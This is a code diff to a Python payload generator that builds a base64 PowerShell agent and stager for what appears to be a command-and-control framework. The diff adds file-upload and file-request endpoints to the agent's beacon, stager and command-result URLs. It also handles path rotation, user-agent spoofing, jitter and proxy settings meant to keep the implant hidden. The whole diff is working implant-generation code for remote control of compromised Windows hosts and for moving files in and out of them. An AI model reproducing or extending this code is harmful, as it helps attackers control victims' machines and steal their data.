@@ -103,16 +103,18 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         "agent_path": "/raw_agent",
         "stager_path": "/b64_stager",
         "cmd_result_path": "/command_result",
+        "file_upload_path": "/file_upload",
+        "file_request_path": "/file_request"
     }
     
     if os.path.exists(url_paths_file):
         try:
             with open(url_paths_file, 'r') as f:
                 custom_paths = json.load(f)
-                # Only use the paths we need for the simplified agent
-                for key in ["beacon_path", "agent_path", "stager_path", "cmd_result_path"]:
-                    if key in custom_paths:
-                        url_paths[key] = custom_paths[key]
+                # Update with custom paths
+                for key, path in custom_paths.items():
+                    if key in url_paths:
+                        url_paths[key] = path
         except Exception as e:
             print(f"Warning: Could not load URL paths: {e}")
     
@@ -163,11 +165,21 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
     proxy_enabled = agent_config.get("proxy_enabled", False)
     proxy_enabled_ps = "$true" if proxy_enabled else "$false"
     
+    # Create rotation info structure
+    rotation_info = {
+        "current_rotation_id": rotation_id,
+        "next_rotation_time": next_rotation_time,
+        "rotation_interval": rotation_interval,
+        "current_paths": url_paths
+    }
+    
     # Generate agent code using templates with additional parameters
     agent_ps1 = generate_from_templates(
         server_address=server_address,
         beacon_path=url_paths["beacon_path"],
         cmd_result_path=url_paths["cmd_result_path"],
+        file_upload_path=url_paths["file_upload_path"],
+        file_request_path=url_paths["file_request_path"],
         rotation_enabled=rotation_enabled,
         rotation_id=str(rotation_id),
         next_rotation_time=str(next_rotation_time),
@@ -229,6 +241,8 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         f"   - Agent Download URL: {http}://{server_address}{url_paths['agent_path']}\n"
         f"   - Stager URL: {http}://{server_address}{url_paths['stager_path']}\n"
         f"   - Command Result URL: {http}://{server_address}{url_paths['cmd_result_path']}\n"
+        f"   - File Upload URL: {http}://{server_address}{url_paths['file_upload_path']}\n"
+        f"   - File Request URL: {http}://{server_address}{url_paths['file_request_path']}\n"
         f"6. User-Agent: {agent_config.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')}\n"
         f"7. Beacon Configuration:\n"
         f"   - Interval: {agent_config.get('beacon_period', 5)} seconds\n" 
@@ -261,7 +275,7 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
                            beacon_interval, jitter_percentage, max_failures, max_backoff,
                            random_sleep_enabled="$false", max_sleep_time=10, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            username="", password="", proxy_enabled="$false", proxy_type="system",
-                           proxy_server="", proxy_port="", url_paths=None):
+                           proxy_server="", proxy_port="", url_paths=None, file_upload_path=None, file_request_path=None):
     """Generate the PowerShell agent code from templates with all options"""
     
     # Get template paths
@@ -292,6 +306,20 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
     else:
         print(f"Warning: File operations template not found: {file_operations_template_path}")
     
+    # Use provided file paths or extract from url_paths dictionary
+    if file_upload_path is None and url_paths and "file_upload_path" in url_paths:
+        file_upload_path = url_paths["file_upload_path"]
+    
+    if file_request_path is None and url_paths and "file_request_path" in url_paths:
+        file_request_path = url_paths["file_request_path"]
+    
+    # Use default fallback values if still None
+    if file_upload_path is None:
+        file_upload_path = "/file_upload"
+    
+    if file_request_path is None:
+        file_request_path = "/file_request"
+    
     # Fill in the path rotation template
     path_rotation_code = ""
     if rotation_enabled:
@@ -302,9 +330,9 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
         path_rotation_code = path_rotation_code.replace("{{BEACON_PATH}}", beacon_path)
         path_rotation_code = path_rotation_code.replace("{{CMD_RESULT_PATH}}", cmd_result_path)
         
-        # Use fixed fallback paths since we don't have url_paths in this context
-        path_rotation_code = path_rotation_code.replace("{{FILE_UPLOAD_PATH}}", "/file_upload")
-        path_rotation_code = path_rotation_code.replace("{{FILE_REQUEST_PATH}}", "/file_request")
+        # Include file upload and request paths
+        path_rotation_code = path_rotation_code.replace("{{FILE_UPLOAD_PATH}}", file_upload_path)
+        path_rotation_code = path_rotation_code.replace("{{FILE_REQUEST_PATH}}", file_request_path)
     
     # Fill in the agent template with all values
     agent_code = agent_template
